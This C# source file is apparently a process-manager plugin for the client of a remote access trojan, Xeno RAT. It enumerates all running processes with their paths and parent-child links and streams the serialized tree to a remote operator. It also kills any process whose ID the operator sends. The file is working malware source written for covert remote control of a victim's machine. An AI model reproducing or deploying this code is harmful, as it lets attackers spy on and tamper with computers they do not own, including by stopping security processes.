using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Creates a snapshot of the specified processes, heaps, modules, and threads.
        /// </summary>
        /// <param name="dwFlags">The type of the snapshot to be taken.</param>
        /// <param name="th32ProcessID">The process identifier of the process to be included in the snapshot.</param>
        /// <returns>An opaque handle to the snapshot on success; otherwise, it returns IntPtr.Zero.</returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        /// <summary>
        /// Retrieves information about the first process encountered in a system snapshot.
        /// </summary>
        /// <param name="hSnapshot">A handle to the snapshot returned from a previous call to <see cref="CreateToolhelp32Snapshot"/>.</param>
        /// <param name="lppe">A reference to a <see cref="PROCESSENTRY32"/> structure. It contains process information.</param>
        /// <returns>
        /// Returns true if the first entry of the process list is copied to the buffer specified by <paramref name="lppe"/>.
        /// If no processes are found or if the function fails, it returns false. To get extended error information, call <see cref="Marshal.GetLastWin32Error"/>.
        /// </returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        /// <summary>
        /// Retrieves information about the next process recorded in a system snapshot.
        /// </summary>
        /// <param name="hSnapshot">A handle to the snapshot returned from a previous call to <see cref="CreateToolhelp32Snapshot"/>.</param>
        /// <param name="lppe">A reference to a <see cref="PROCESSENTRY32"/> structure. It contains process information.</param>
        /// <returns>True if the next entry of the process list is copied into the <paramref name="lppe"/> structure; otherwise, false.</returns>
        /// <exception cref="Win32Exception">Thrown when an error occurs during the call to the Windows API function.</exception>
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        private Dictionary<string, string> windowsProcessPaths = new Dictionary<string, string>()
        {
            { "svchost.exe", @"C:\Windows\System32\svchost.exe" },
            { "explorer.exe", @"C:\Windows\explorer.exe" },
            { "taskhost.exe", @"C:\Windows\system32\taskhost.exe" },
            { "services.exe", @"C:\Windows\System32\services.exe" },
            { "lsass.exe", @"C:\Windows\System32\lsass.exe" },
            { "wininit.exe", @"C:\Windows\System32\wininit.exe" },
            { "csrss.exe", @"C:\Windows\System32\csrss.exe" },
            { "smss.exe", @"C:\Windows\System32\smss.exe" },
            { "spoolsv.exe", @"C:\Windows\System32\spoolsv.exe" },
            { "winlogon.exe", @"C:\Windows\System32\winlogon.exe" },
            { "dwm.exe", @"C:\Windows\System32\dwm.exe" },
            { "taskeng.exe", @"C:\Windows\System32\taskeng.exe" },
            { "logonui.exe", @"C:\Windows\System32\logonui.exe" },
            { "ctfmon.exe", @"C:\Windows\System32\ctfmon.exe" },
            { "cmd.exe", @"C:\Windows\System32\cmd.exe" },
            { "wmiprvse.exe", @"C:\Windows\System32\wbem\wmiprvse.exe" },
            { "iexplore.exe", @"C:\Program Files\Internet Explorer\iexplore.exe" },
            { "calc.exe", @"C:\Windows\System32\calc.exe" },
            { "notepad.exe", @"C:\Windows\System32\notepad.exe" },
            { "regedit.exe", @"C:\Windows\regedit.exe" },
            { "mspaint.exe", @"C:\Windows\System32\mspaint.exe" },
            { "mstsc.exe", @"C:\Windows\System32\mstsc.exe" }
        };

        private class ProcessNode
        {
            public Process Process { get; }
            public int PID { get; }
            public List<ProcessNode> Children { get; }
            public string FilePath { get; }
            public string FileDescription { get; }
            public string Name { get; }

            public ProcessNode(Process process, string filePath)
            {
                Process = process ?? throw new ArgumentNullException(nameof(process));
                PID = process.Id;
                Name = process.ProcessName;
                Children = new List<ProcessNode>();
                FilePath = filePath ?? throw new ArgumentNullException(nameof(filePath));
                FileDescription = GetFileDescription(filePath);
            }

            /// <summary>
            /// Gets the description of the file from the specified file path.
            /// </summary>
            /// <param name="filePath">The path of the file for which the description is to be retrieved.</param>
            /// <returns>The description of the file, or "Unknown" if the file path is null or empty, or if an error occurs while retrieving the file description.</returns>
            /// <remarks>
            /// This method retrieves the file version information using the <see cref="System.Diagnostics.FileVersionInfo.GetVersionInfo(string)"/> method.
            /// If the file description is null, it returns "Unknown".
            /// If an exception occurs during the process, it also returns "Unknown".
            /// </remarks>
            private  string GetFileDescription(string filePath)
            {
                if (string.IsNullOrEmpty(filePath))
                {
                    return "Unknown";
                }

                try
                {
                    FileVersionInfo fileVersionInfo = FileVersionInfo.GetVersionInfo(filePath);
                    if (fileVersionInfo.FileDescription == null) 
                    {
                        return "Unknown";
                    }
                    return fileVersionInfo.FileDescription;
                }
                catch
                {
                    return "Unknown";
                }
            }
        }

        /// <summary>
        /// Retrieves the file paths of all running processes and returns them as a dictionary with process IDs as keys and file paths as values.
        /// </summary>
        /// <returns>A dictionary containing process IDs as keys and file paths as values.</returns>
        /// <remarks>
        /// This method asynchronously retrieves the file paths of all running processes using Windows Management Instrumentation (WMI).
        /// It queries the Win32_Process class to obtain information about running processes, including their process IDs, descriptions, executable paths, and command lines.
        /// If the executable path is not available, it attempts to extract it from the command line. If still unavailable, it looks up the path in a predefined dictionary.
        /// The method handles ManagementException if the WMI query fails and disposes of the resources used for the query.
        /// </remarks>
        private async Task<Dictionary<int, string>> GetAllProcessFilePathsAsync()
        {
            return await Task.Run(() =>
            {
                var processFilePaths = new Dictionary<int, string>();
                ManagementObjectSearcher searcher = null;
                ManagementObjectCollection objects = null;
                try
                {
                    searcher = new ManagementObjectSearcher("SELECT Description, ProcessId, ExecutablePath, CommandLine FROM Win32_Process");
                    objects = searcher.Get();
                    foreach (ManagementObject obj in objects)
                    {
                        int processId = Convert.ToInt32(obj["ProcessId"]);
                        string filename = obj["Description"].ToString();
                        string filePath = obj["ExecutablePath"]?.ToString() ?? string.Empty;

                        if (string.IsNullOrEmpty(filePath))
                        {
                            // If ExecutablePath is null, try to retrieve the path from the CommandLine
                            string commandLine = obj["CommandLine"]?.ToString() ?? string.Empty;
                            filePath = ExtractFilePathFromCommandLine(commandLine);
                        }
                        if (string.IsNullOrEmpty(filePath))
                        {
                            if (windowsProcessPaths.TryGetValue(filename, out string path))
                            {
                                filePath = path;
                            }
                        }
                        processFilePaths[processId] = filePath;
                        obj.Dispose();
                    }

                }
                catch (ManagementException)
                {
                    // Handle exceptions if WMI query fails
                }
                finally
                {
                    searcher?.Dispose();
                    objects?.Dispose();
                }
                return processFilePaths;
            });
        }

        /// <summary>
        /// Retrieves the file paths of all running processes and returns them in a dictionary with process IDs as keys and file paths as values.
        /// </summary>
        /// <returns>A dictionary containing process IDs as keys and file paths as values.</returns>
        /// <remarks>
        /// This method uses WMI (Windows Management Instrumentation) to query information about running processes and retrieve their file paths.
        /// It iterates through the retrieved ManagementObjects, extracts process ID, description, executable path, and command line information, and populates the dictionary with process IDs as keys and corresponding file paths as values.
        /// If the executable path is null, it attempts to retrieve the path from the command line. If the path is still not found, it looks up the path in a predefined dictionary of known Windows process paths.
        /// The method handles ManagementException if the WMI query fails and disposes of the ManagementObjectSearcher and ManagementObjectCollection to release resources.
        /// </remarks>
        private Dictionary<int, string> GetAllProcessFilePaths()
        {
            var processFilePaths = new Dictionary<int, string>();
            ManagementObjectSearcher searcher=null;
            ManagementObjectCollection objects=null;
            try
            {
                searcher = new ManagementObjectSearcher("SELECT Description, ProcessId, ExecutablePath, CommandLine FROM Win32_Process");
                objects = searcher.Get();
                foreach (ManagementObject obj in objects)
                {
                    int processId = Convert.ToInt32(obj["ProcessId"]);
                    string filename = obj["Description"].ToString();
                    string filePath = obj["ExecutablePath"]?.ToString() ?? string.Empty;
                
                    if (string.IsNullOrEmpty(filePath))
                    {
                        // If ExecutablePath is null, try to retrieve the path from the CommandLine
                        string commandLine = obj["CommandLine"]?.ToString() ?? string.Empty;
                        filePath = ExtractFilePathFromCommandLine(commandLine);
                    }
                    if (string.IsNullOrEmpty(filePath))
                    {
                        if (windowsProcessPaths.TryGetValue(filename, out string path))
                        {
                            filePath = path;
                        }
                    }
                    processFilePaths[processId] = filePath;
                    obj.Dispose();
                }
               
            }
            catch (ManagementException)
            {
                // Handle exceptions if WMI query fails
            }
            if (searcher != null) 
            {
                searcher.Dispose();  
            }
            if (objects != null)
            {
                objects.Dispose();
            }
            return processFilePaths;
        }

        /// <summary>
        /// Extracts the file path from the given command line input.
        /// </summary>
        /// <param name="commandLine">The command line input from which the file path needs to be extracted.</param>
        /// <returns>The file path extracted from the command line input. Returns an empty string if no file path is found.</returns>
        /// <remarks>
        /// This method extracts the file path from the provided command line input by searching for the first token that ends with .exe or .dll.
        /// It splits the command line by whitespace and iterates through the tokens to find the file path.
        /// If no file path is found, it returns an empty string.
        /// </remarks>
        private  string ExtractFilePathFromCommandLine(string commandLine)
        {
            // Extract the file path from the command line using custom logic
            // Modify this logic based on your requirements and assumptions about the command line format

            string filePath = string.Empty;

            if (!string.IsNullOrEmpty(commandLine))
            {
                // Split the command line by whitespace
                string[] tokens = commandLine.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

                // Look for the first token that ends with .        // Look for the first token that ends with .exe or .dll to extract the file path
                foreach (string token in tokens)
                {
                    if (token.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) || token.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    {
                        filePath = token;
                        break;
                    }
                }
            }

            return filePath;
        }

        /// <summary>
        /// Builds a process tree based on the input processes and their file paths.
        /// </summary>
        /// <param name="processes">An array of Process objects representing the processes to be included in the tree.</param>
        /// <param name="processFilePaths">A dictionary containing the file paths for the processes, with the process ID as the key.</param>
        /// <returns>A dictionary representing the process tree, where the key is the process ID and the value is the corresponding ProcessNode.</returns>
        /// <remarks>
        /// This method builds a process tree by creating a ProcessNode for each process in the input array and then linking them based on their parent-child relationships.
        /// If a process has a parent, it is added as a child to the corresponding parent node in the tree.
        /// The file path for each process is retrieved from the processFilePaths dictionary and used to initialize the ProcessNode.
        /// </remarks>
        /// <exception cref="ArgumentNullException">Thrown if either the processes array or the processFilePaths dictionary is null.</exception>
        /// <exception cref="InvalidOperationException">Thrown if there is a problem retrieving the parent process ID asynchronously.</exception>
        private async Task<Dictionary<int, ProcessNode>> BuildProcessTree(Process[] processes, Dictionary<int, string> processFilePaths)
        {
            var processMap = new Dictionary<int, ProcessNode>();

            foreach (var process in processes)
            {
                string filePath = processFilePaths.ContainsKey(process.Id) ? processFilePaths[process.Id] : string.Empty;
                ProcessNode node = new ProcessNode(process, filePath);
                processMap[process.Id] = node;
            }

            foreach (var process in processes)
            {
                if (processMap.TryGetValue(process.Id, out var childNode))
                {
                    int parentId = await GetParentProcessIdAsync(process);
                    if (processMap.TryGetValue(parentId, out var parentNode))
                    {
                        parentNode.Children.Add(childNode);
                    }
                }
            }

            return processMap;
        }

        /// <summary>
        /// Asynchronously retrieves the parent process ID for the given process.
        /// </summary>
        /// <param name="process">The process for which to retrieve the parent process ID.</param>
        /// <returns>
        /// The parent process ID of the specified <paramref name="process"/>.
        /// If the parent process ID is not found, -1 is returned as the default value.
        /// </returns>
        /// <exception cref="Win32Exception">
        /// Thrown when an error occurs while retrieving the parent process ID using Win32 API functions.
        /// </exception>
        /// <remarks>
        /// This method asynchronously retrieves the parent process ID for the given <paramref name="process"/> using Win32 API functions.
        /// It creates a snapshot of the current processes, iterates through the snapshot to find the parent process ID of the specified process, and returns the result.
        /// If an error occurs during the process retrieval, a <see cref="Win32Exception"/> is thrown with the corresponding error code.
        /// </remarks>
        private async Task<int> GetParentProcessIdAsync(Process process)
        {
            return await Task.Run(() =>
            {
                IntPtr snapshotHandle = CreateToolhelp32Snapshot(2 /* TH32CS_SNAPPROCESS */, 0);

                if (snapshotHandle.ToInt64() == -1)
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                PROCESSENTRY32 processEntry = new PROCESSENTRY32();
                processEntry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

                if (!Process32First(snapshotHandle, ref processEntry))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                do
                {
                    if (processEntry.th32ProcessID == (uint)process.Id)
                    {
                        return (int)processEntry.th32ParentProcessID;
                    }
                }
                while (Process32Next(snapshotHandle, ref processEntry));

                return -1; // Default value if parent process ID is not found
            });
        }

        /// <summary>
        /// Retrieves the parent process ID of the specified process.
        /// </summary>
        /// <param name="process">The process for which the parent process ID needs to be retrieved.</param>
        /// <exception cref="Win32Exception">Thrown when an error occurs while retrieving the parent process ID.</exception>
        /// <returns>The parent process ID of the specified <paramref name="process"/>. Returns -1 if the parent process ID is not found.</returns>
        /// <remarks>
        /// This method retrieves the parent process ID of the specified <paramref name="process"/> by using the Windows API function CreateToolhelp32Snapshot to create a snapshot of the system and then iterating through the processes to find the parent process ID.
        /// If an error occurs during the retrieval process, a Win32Exception is thrown with the corresponding error code.
        /// </remarks>
        private int GetParentProcessId(Process process)
        {
            IntPtr snapshotHandle = CreateToolhelp32Snapshot(2 /* TH32CS_SNAPPROCESS */, 0);

            if (snapshotHandle.ToInt64() == -1)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }

            PROCESSENTRY32 processEntry = new PROCESSENTRY32();
            processEntry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

            if (!Process32First(snapshotHandle, ref processEntry))
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }

            do
            {
                if (processEntry.th32ProcessID == (uint)process.Id)
                {
                    return (int)processEntry.th32ParentProcessID;
                }
            }
            while (Process32Next(snapshotHandle, ref processEntry));

            return -1; // Default value if parent process ID is not found
        }

        /// <summary>
        /// Gets the root processes from the provided process map.
        /// </summary>
        /// <param name="processMap">The dictionary containing process nodes with their respective IDs.</param>
        /// <returns>A list of root process nodes.</returns>
        /// <remarks>
        /// This method iterates through the process nodes in the input <paramref name="processMap"/> and identifies the ones that do not have a parent process in the map.
        /// It then adds these root process nodes to a new list and returns it.
        /// </remarks>
        private  List<ProcessNode> GetRootProcesses(Dictionary<int, ProcessNode> processMap)
        {
            var rootProcesses = new List<ProcessNode>();

            foreach (var processNode in processMap.Values)
            {
                if (!processMap.ContainsKey(GetParentProcessId(processNode.Process)))
                {
                    rootProcesses.Add(processNode);
                }
            }

            return rootProcesses;
        }

        /// <summary>
        /// Serializes the list of process nodes into a byte array.
        /// </summary>
        /// <param name="processList">The list of process nodes to be serialized.</param>
        /// <returns>A byte array representing the serialized process list.</returns>
        /// <remarks>
        /// This method serializes the input list of process nodes into a byte array using the BinaryWriter class and MemoryStream class.
        /// It first writes the count of process nodes and then serializes each process node using the SerializeProcessNode method.
        /// The resulting byte array represents the serialized process list and is returned as the output of this method.
        /// </remarks>
        private  byte[] SerializeProcessList(List<ProcessNode> processList)
        {
            byte[] done;
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                // Serialize the number of processes
                writer.Write(processList.Count);

                // Serialize each process node
                foreach (var processNode in processList)
                {
                    SerializeProcessNode(processNode, writer);
                }

                done=memoryStream.ToArray();
            }
            return done;
        }

        /// <summary>
        /// Serializes the process node and writes it to the binary writer.
        /// </summary>
        /// <param name="node">The process node to be serialized.</param>
        /// <param name="writer">The binary writer to which the serialized data is written.</param>
        /// <remarks>
        /// This method serializes the process node by writing its PID, number of children, file path, file description, and name to the binary writer.
        /// It then recursively serializes each child node by calling itself for each child in the node's children collection.
        /// </remarks>
        private void SerializeProcessNode(ProcessNode node, BinaryWriter writer)
        {
            writer.Write(node.PID);
            writer.Write(node.Children.Count);
            writer.Write(node.FilePath);
            writer.Write(node.FileDescription);
            writer.Write(node.Name);

            foreach (var child in node.Children)
            {
                SerializeProcessNode(child, writer);
            }
        }

        /// <summary>
        /// Disposes all the processes in the input array.
        /// </summary>
        /// <param name="processes">The array of processes to be disposed.</param>
        /// <remarks>
        /// This method iterates through each process in the input array and disposes of it using the Dispose method.
        /// </remarks>
        private void disposeAllProcess(Process[] processes) 
        {
            foreach (Process i in processes) 
            {
                i.Dispose();
            }
        }

        private bool paused = false;

        /// <summary>
        /// Asynchronously receives data from the specified node and processes it accordingly.
        /// </summary>
        /// <param name="node">The node from which to receive data.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the data processing.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method continuously receives data from the specified <paramref name="node"/> while it is connected.
        /// If the received data is null, the method returns.
        /// If the length of the received data is 1, it sets the <c>paused</c> flag to true if the data is 1, otherwise sets it to false.
        /// If the length of the received data is 4, it attempts to retrieve a process using the received data as the process ID.
        /// If successful, it kills the retrieved process and disposes of it.
        /// </remarks>
        public async Task RecvThread(Node node) 
        {
            while (node.Connected())
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    return;
                }
                if (data.Length == 1)
                {
                    if (data[0] == (byte)1)
                    {
                        paused = true;
                    }
                    else
                    {
                        paused = false;
                    }
                }
                else if (data.Length == 4) 
                {
                    Process process=null;
                    try
                    {
                        int pid = node.sock.BytesToInt(data);
                        process = Process.GetProcessById(pid);
                        process.Kill();
                    }
                    catch 
                    { 
                    
                    }
                    if (process != null) 
                    {
                        process.Dispose();
                    }
                    
                }
            }
        }

        /// <summary>
        /// Asynchronously runs the node and sends process information to the connected node.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <exception cref="ArgumentNullException">Thrown when the input node is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected.
        /// It then continuously receives data from the node and processes it.
        /// While the node is connected, it retrieves the list of processes, builds a process tree, and sends the root processes to the connected node.
        /// If the method is paused, it delays for 500 milliseconds before continuing.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            RecvThread(node);
            while (node.Connected())
            {
                if (!paused)
                {
                    Process[] processes = Process.GetProcesses();
                    Dictionary<int, string> processFilePaths = await GetAllProcessFilePathsAsync();
                    Dictionary<int, ProcessNode> processMap = await BuildProcessTree(processes, processFilePaths);
                    List<ProcessNode> rootProcesses = GetRootProcesses(processMap);
                    disposeAllProcess(processes);
                    byte[] searlized = SerializeProcessList(rootProcesses);
                    await node.SendAsync(searlized);
                }
                else 
                {
                    await Task.Delay(500);
                }
            }
        }
    }
}
